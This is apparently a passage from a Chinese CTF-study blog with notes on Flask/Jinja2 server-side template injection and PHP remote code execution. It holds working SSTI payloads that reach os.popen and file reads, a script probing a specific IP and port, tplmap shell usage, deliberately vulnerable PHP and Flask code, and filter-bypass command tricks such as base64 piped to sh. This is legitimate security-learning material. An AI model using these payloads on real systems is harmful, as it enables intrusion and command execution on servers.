<p>__init__初始化类，然后globals全局来查找所有的的方法及变量参数</p>
<p>要找到这个类&lt;class ‘os._wrap_close’&gt; 所对应的序号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">198</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[i].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[i])</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__().index(os._wrap_close))</span><br></pre></td></tr></table></figure>



<p>这样的话就可以使用各种各样的方法比如popen</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()  <span class="comment">#这样就可以读取当前目录下的内容</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;flag.txt&#x27;</span>).read()   <span class="comment">#这样就实现了读取文件 </span></span><br></pre></td></tr></table></figure>

<h2 id="通过查找对应的函数模块或者类来进行构造"><a href="#通过查找对应的函数模块或者类来进行构造" class="headerlink" title="通过查找对应的函数模块或者类来进行构造"></a>通过查找对应的函数模块或者类来进行构造</h2><h3 id="查找eval函数"><a href="#查找eval函数" class="headerlink" title="查找eval函数"></a>查找eval函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os.py&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload:&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="查找os模块"><a href="#查找os模块" class="headerlink" title="查找os模块"></a>查找os模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os.py&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload:&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="查找importlib类"><a href="#查找importlib类" class="headerlink" title="查找importlib类"></a>查找importlib类</h3><p>Python 中存在 &lt;class ‘_frozen_importlib.BuiltinImporter’&gt; 类，目的就是提供 Python 中 import 语句的实现（以及 <strong>import</strong> 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。</p>
<p>也可以搜索__import__函数来导入os模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload:&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="类的总结"><a href="#类的总结" class="headerlink" title="类的总结"></a>类的总结</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each <span class="keyword">class</span> <span class="title class_">keeps</span> a <span class="built_in">list</span> of weak references to its immediate subclasses. This method returns a <span class="built_in">list</span> of <span class="built_in">all</span> those references still alive. The <span class="built_in">list</span> <span class="keyword">is</span> <span class="keyword">in</span> definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="string">&#x27;b&#x27;</span>]，就是a.__getitem__(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身如<span class="built_in">eval</span>()函数。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"><span class="built_in">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="built_in">open</span>函数:request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json		 post传json  (Content-<span class="type">Type</span>: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of <span class="string">&#x27;flask_ssti&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">138</span>).__init__.__globals__.get(<span class="string">&#x27;popen&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="利用config读取flag"><a href="#利用config读取flag" class="headerlink" title="利用config读取flag"></a>利用config读取flag</h3><p>如果flag是利用app.config[‘flag’]&#x3D;’*******’ 进行配置的</p>
<p>则可以利用来读取</p>
<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;self.<span class="built_in">dict</span>.__TemplateReference__context.config&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[<span class="string">&#x27;json&#x27;</span>].JSONEncoder.default.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单的ssti漏洞代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    app.config[<span class="string">&#x27;flag&#x27;</span>] = <span class="string">&#x27;sdhgfdfsdhfjsgfs&#x27;</span></span><br><span class="line">    templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Title&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">        &#123;&#125;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(request.args.get(<span class="string">&#x27;key&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>



<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>使用括号进行绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()&#125;&#125; </span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__.get(request.args.func)(request.args.cmd).read()&#125;&#125;&amp;func=popen&amp;cmd=<span class="built_in">dir</span></span><br></pre></td></tr></table></figure>

<h3 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__getattribute__(<span class="string">&#x27;__&#x27;</span>+<span class="string">&quot;cl&quot;</span>+<span class="string">&quot;ass&quot;</span>+<span class="string">&#x27;__&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="TPLMAP的使用"><a href="#TPLMAP的使用" class="headerlink" title="TPLMAP的使用"></a>TPLMAP的使用</h2><p>下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/epinna/tplmap.git</span><br></pre></td></tr></table></figure>

<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tplmap.py -u &quot;url/?key=111*&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取shell</span></span><br><span class="line">python2 tplmap.py -u url?flag --os-shell</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看目录</span></span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line"><span class="comment">#发现flag文件，打开</span></span><br><span class="line">cat flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-RCE"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/15/RCE/"
    >RCE</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/15/RCE/" class="article-date">
  <time datetime="2023-03-15T11:49:36.000Z" itemprop="datePublished">2023-03-15</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/RCE/">RCE</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="代码执行的相关函数"><a href="#代码执行的相关函数" class="headerlink" title="代码执行的相关函数"></a>代码执行的相关函数</h2><p>eval函数会把函数内的语句当作php代码执行但是 语句后面需要分号</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>assert与eval功能相似 但是兼容性更强  后面加不加分号都可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">assert</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo();</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br></pre></td></tr></table></figure>

<p>安全防御：加引号</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;\ret= strtolower(&#x27;<span class="subst">$cmd</span>&#x27;);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>只有GPC配置文件开启才能绕过   高版本的PHP已经淘汰GPC</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="string">&#x27;);phpinfo();//</span></span><br></pre></td></tr></table></figure>

<p>preg_replace()   加上&#x2F;e会  匹配之后会形成代码执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/abc/e&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&#x27;abcd&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>$_REQUEST  包含GET,POST,COOKIE方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;</span>,<span class="string">&#x27;$ret=&quot;\\1&quot;&#x27;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<h2 id="命令执行相关函数"><a href="#命令执行相关函数" class="headerlink" title="命令执行相关函数"></a>命令执行相关函数</h2><p>[PHP执行系统外部命令:exec()、passthru()、system()、shell_exec()</p>
<p><a target="_blank" rel="noopener" href="http://hi.baidu.com/cszhi/item/d71d61f22feefe16ce9f32d1"><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.exec.php">官方文档</a></a></p>
<p><img src="/2023/03/15/RCE/image-20221215114124054.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec()函数无回显</span><br><span class="line">因为exec没有回显，所以可以存入文件中，或借助print_r进行输出 </span><br><span class="line">使用姿势：echo exec(&quot;ls&quot;,$file); </span><br><span class="line">exec(print_r(system(ls))); //system和print_r 都可以替换为作用相似的函数使用</span><br><span class="line">或者使用linux命令tee内容写入到文件中</span><br><span class="line">ls  | tee 1.txt</span><br><span class="line">然后访问1.txt就行</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="1-空格被过滤"><a href="#1-空格被过滤" class="headerlink" title="1.空格被过滤"></a>1.空格被过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">linux</span><br><span class="line">%<span class="number">09</span>(tap)</span><br><span class="line">    </span><br><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$<span class="string">&#x27;\x20flag.txt&#x27;</span>&amp;&amp;cat<span class="variable">$kg</span>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br><span class="line"></span><br><span class="line">windows下</span><br><span class="line"></span><br><span class="line">（实用性不是很广，也就type这个命令可以用）</span><br><span class="line">type.\flag.txt</span><br><span class="line">type,flag.txt</span><br><span class="line"><span class="keyword">echo</span>,<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<h3 id="2-关键字被过滤"><a href="#2-关键字被过滤" class="headerlink" title="2.关键字被过滤"></a>2.关键字被过滤</h3><ul>
<li><p>可以采用重命名变量然后拼接  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg.过滤了ls</span><br><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>采用base64的方法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`base64内容 | base64 -d`</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">汇总几种关键字绕过方式 以flag为例</span><br><span class="line">* 单引号绕过 fla&#x27;g&#x27;</span><br><span class="line">* 双引号绕过 fla&quot;g&quot;</span><br><span class="line">* 反斜线绕过 f\lag</span><br><span class="line">* 变量拼接绕过 a=g;cat$IFS$1fla$a.php</span><br><span class="line">* $+任意数字绕过 fl$1ag </span><br><span class="line">* Base64绕过 cat flag.php 的base64编码为Y2F0IGZsYWcucGhw</span><br><span class="line">  echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">* 内联绕过 就是将反引号内命令的输出作为输入执行</span><br><span class="line">  cat `ls`</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
